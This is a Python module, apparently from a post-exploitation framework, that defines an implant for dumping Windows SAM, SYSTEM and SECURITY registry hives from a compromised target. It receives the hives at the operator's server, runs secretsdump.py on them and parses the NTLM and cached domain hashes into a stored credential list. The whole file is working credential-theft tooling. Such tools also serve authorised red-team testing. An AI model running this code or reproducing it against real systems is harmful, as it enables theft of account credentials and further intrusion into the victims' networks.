import core.implant

class HashDumpSAMImplant(core.implant.Implant):

    NAME = "SAM Hash Dump"
    DESCRIPTION = "Dumps the SAM hive off the target system."
    AUTHORS = ["zerosum0x0"]

    def load(self):
        self.options.register("LPATH", "/tmp/", "local file save path")
        self.options.register("RPATH", "%TEMP%", "remote file save path")

    def run(self):
        payloads = {}
        payloads["js"] = self.loader.load_script("data/implant/gather/hashdump_sam.js", self.options)

        self.dispatch(payloads, HashDumpSAMJob)

class HashDumpSAMJob(core.job.Job):

    def save_file(self, data):
        import uuid
        save_fname = self.options.get("LPATH") + "/" + uuid.uuid4().hex
        save_fname = save_fname.replace("//", "/")

        with open(save_fname, "wb") as f:
            data = self.decode_downloaded_data(data)
            f.write(data)

        return save_fname

    def report(self, handler, data, sanitize = False):
        task =  handler.get_header("Task", False)

        if task == "SAM":
            handler.reply(200)
            self.print_status("received SAM hive (%d bytes)" % len(data))
            self.sam_data = data
            return

        if task == "SYSTEM":
            handler.reply(200)

            self.print_status("received SYSTEM hive (%d bytes)" % len(data))
            self.system_data = data
            return

        if task == "SECURITY":
            handler.reply(200)

            self.print_status("received SECURITY hive (%d bytes)" % len(data))
            self.security_data = data
            return

        # dump sam here

        import threading
        self.finished = False
        threading.Thread(target=self.finish_up).start()
        handler.reply(200)

    def finish_up(self):

        from subprocess import Popen, PIPE, STDOUT
        p = Popen(["which", "secretsdump.py"], stdout=PIPE)
        path = p.communicate()[0].strip()
        path = path.decode() if type(path) is bytes else path
        if not path:
            print("Error decoding: secretsdump.py not in PATH!")
            return

        self.sam_file = self.save_file(self.sam_data)
        self.print_status("decoded SAM hive (%s)" % self.sam_file)

        self.security_file = self.save_file(self.security_data)
        self.print_status("decoded SECURITY hive (%s)" % self.security_file)

        self.system_file = self.save_file(self.system_data)
        self.print_status("decoded SYSTEM hive (%s)" % self.system_file)

        cmd = ['python2', path, '-sam', self.sam_file, '-system', self.system_file, '-security', self.security_file, 'LOCAL']
        p = Popen(cmd, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
        output = p.stdout.read().decode()
        self.shell.print_plain(output)

        sam_sec1 = output.split("[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)")[1]
        sam_sec2 = sam_sec1.split("[*] Dumping cached domain logon information (uid:encryptedHash:longDomain:domain)")[0]
        sam_sec = sam_sec2.splitlines()
        cached_sec1 = output.split("[*] Dumping cached domain logon information (uid:encryptedHash:longDomain:domain)")[1]
        cached_sec2 = cached_sec1.split("[*] Dumping LSA Secrets")[0]
        cached_sec = cached_sec2.splitlines()

        del sam_sec[0]
        del cached_sec[0]

        for htype in ["sam", "cached"]:
            hsec = locals().get(htype+"_sec")
            if hsec[0].split()[0] == "[-]":
                continue
            for h in hsec:
                c = {}
                c["IP"] = self.session.ip
                hparts = h.split(":")
                c["Username"] = hparts[0]
                c["Password"] = ""
                if htype == "sam":
                    c["Hash"] = hparts[-1]
                    c["HashType"] = "NTLM"
                    c["Domain"] = ""
                else:
                    c["Hash"] = hparts[1]
                    c["HashType"] = "DCC"
                    c["Domain"] = hparts[2]
                self.shell.creds.append(c)

        super(HashDumpSAMJob, self).report(None, "", False)

    def done(self):
        #self.display()
        pass

    def display(self):
        pass
